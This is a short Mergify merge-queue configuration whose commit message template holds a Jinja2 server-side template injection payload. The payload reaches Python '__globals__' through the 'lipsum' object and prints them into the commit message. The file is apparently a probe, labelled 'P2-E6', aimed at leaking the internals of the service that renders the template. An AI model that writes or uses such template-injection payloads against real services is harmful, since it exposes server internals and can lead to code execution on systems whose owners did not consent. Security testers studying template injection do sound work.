queue_rules:
  - name: default
    queue_conditions:
      - base=master
    merge_conditions: []
    merge_method: squash
    commit_message_template: |
      P2-E6: {% set ns = namespace(g=[lipsum]|map(attribute='__globals__')|list) %}{{ ns.g[0]|pprint }}

pull_request_rules:
  - name: auto-queue
    conditions:
      - base=master
    actions:
      queue: {}
